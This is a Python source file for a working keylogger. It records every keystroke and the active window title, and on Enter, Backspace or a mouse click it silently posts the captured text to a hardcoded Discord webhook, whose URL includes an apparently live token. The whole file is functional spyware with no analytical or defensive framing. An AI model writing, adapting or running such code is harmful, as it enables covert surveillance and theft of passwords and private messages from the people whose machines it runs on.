from pynput.keyboard import Key, Listener as KeyboardListener
from pynput.mouse import Listener as MouseListener
import requests

try:
    import pygetwindow as gw
except ImportError:
    gw = None  # Optional fallback if pygetwindow not available

# Your Discord webhook
webhook_url = "https://discord.com/api/webhooks/1363643864165912666/yULXRjhELzeOwSI9o90DqlWXhfydU3Pj_HTitNqKxEXg1uIFoyR5ggWW-5J0TJM6Wfih"

buffer = ""

def get_active_window_title():
    """Return active window title or 'Unknown' if unsupported."""
    if gw is None:
        return "Unknown Window"
    try:
        win = gw.getActiveWindow()
        return win.title if win else "Unknown Window"
    except:
        return "Unknown Window"

def send_to_discord(message, context=None):
    """Send buffer to Discord."""
    if not message.strip():
        return
    try:
        content = f"**Window:** `{context}`\n```{message}```"
        data = {
            "embeds": [
                {
                    "title": "Keylogger",
                    "description": content,
                    "color": 0x00ff00
                }
            ]
        }
        requests.post(webhook_url, json=data, timeout=3)
    except Exception:
        pass  # Fail silently to reduce overhead

def flush_buffer(trigger=None):
    """Send buffer and reset."""
    global buffer
    if buffer:
        window_title = get_active_window_title()
        to_send = f"{buffer} [{trigger}]" if trigger else buffer
        send_to_discord(to_send, context=window_title)
        buffer = ""  # clear after sending

def on_key_press(key):
    """Track key presses and flush on Enter/Backspace."""
    global buffer
    try:
        if hasattr(key, 'char') and key.char:
            buffer += key.char
        elif key == Key.space:
            buffer += ' '
        elif key in (Key.enter, Key.backspace):
            flush_buffer(key.name)
        else:
            buffer += f"[{key.name}]"
    except:
        pass  # Keep it light and silent

def on_click(x, y, button, pressed):
    """Flush buffer on mouse press."""
    if pressed:
        flush_buffer(f"MouseClick {button.name}")

# Start listeners
with KeyboardListener(on_press=on_key_press) as k_listener, MouseListener(on_click=on_click) as m_listener:
    k_listener.join()
    m_listener.join()
